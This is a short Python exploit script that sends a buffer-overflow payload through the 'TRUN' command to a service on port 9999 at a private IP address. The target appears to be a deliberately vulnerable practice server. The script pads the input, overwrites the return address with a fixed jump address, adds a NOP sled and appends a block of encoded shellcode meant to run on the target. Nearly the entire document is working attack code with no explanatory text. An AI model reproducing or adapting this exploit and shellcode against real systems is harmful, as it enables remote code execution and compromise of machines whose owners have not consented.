#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (
b"\xbf\xbb\x97\x20\xbe\xd9\xeb\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
b"\x52\x83\xc6\x04\x31\x7e\x0e\x03\xc5\x99\xc2\x4b\xc5\x4e\x80"
b"\xb4\x35\x8f\xe5\x3d\xd0\xbe\x25\x59\x91\x91\x95\x29\xf7\x1d"
b"\x5d\x7f\xe3\x96\x13\xa8\x04\x1e\x99\x8e\x2b\x9f\xb2\xf3\x2a"
b"\x23\xc9\x27\x8c\x1a\x02\x3a\xcd\x5b\x7f\xb7\x9f\x34\x0b\x6a"
b"\x0f\x30\x41\xb7\xa4\x0a\x47\xbf\x59\xda\x66\xee\xcc\x50\x31"
b"\x30\xef\xb5\x49\x79\xf7\xda\x74\x33\x8c\x29\x02\xc2\x44\x60"
b"\xeb\x69\xa9\x4c\x1e\x73\xee\x6b\xc1\x06\x06\x88\x7c\x11\xdd"
b"\xf2\x5a\x94\xc5\x55\x28\x0e\x21\x67\xfd\xc9\xa2\x6b\x4a\x9d"
b"\xec\x6f\x4d\x72\x87\x94\xc6\x75\x47\x1d\x9c\x51\x43\x45\x46"
b"\xfb\xd2\x23\x29\x04\x04\x8c\x96\xa0\x4f\x21\xc2\xd8\x12\x2e"
b"\x27\xd1\xac\xae\x2f\x62\xdf\x9c\xf0\xd8\x77\xad\x79\xc7\x80"
b"\xd2\x53\xbf\x1e\x2d\x5c\xc0\x37\xea\x08\x90\x2f\xdb\x30\x7b"
b"\xaf\xe4\xe4\x2c\xff\x4a\x57\x8d\xaf\x2a\x07\x65\xa5\xa4\x78"
b"\x95\xc6\x6e\x11\x3c\x3d\xf9\xde\x69\x22\x7b\xb6\x6b\x5c\x6a"
b"\x1b\xe5\xba\xe6\xb3\xa3\x15\x9f\x2a\xee\xed\x3e\xb2\x24\x88"
b"\x01\x38\xcb\x6d\xcf\xc9\xa6\x7d\xb8\x39\xfd\xdf\x6f\x45\x2b"
b"\x77\xf3\xd4\xb0\x87\x7a\xc5\x6e\xd0\x2b\x3b\x67\xb4\xc1\x62"
b"\xd1\xaa\x1b\xf2\x1a\x6e\xc0\xc7\xa5\x6f\x85\x7c\x82\x7f\x53"
b"\x7c\x8e\x2b\x0b\x2b\x58\x85\xed\x85\x2a\x7f\xa4\x7a\xe5\x17"
b"\x31\xb1\x36\x61\x3e\x9c\xc0\x8d\x8f\x49\x95\xb2\x20\x1e\x11"
b"\xcb\x5c\xbe\xde\x06\xe5\xde\x3c\x82\x10\x77\x99\x47\x99\x1a"
b"\x1a\xb2\xde\x22\x99\x36\x9f\xd0\x81\x33\x9a\x9d\x05\xa8\xd6"
b"\x8e\xe3\xce\x45\xae\x21")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 40 + overflow

try: 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.102',9999))
	
	payload = b"TRUN /.:/" + shellcode
	
	s.send((payload))
	s.close()
	
except:
	print("Error connecting to server")
	sys.exit()
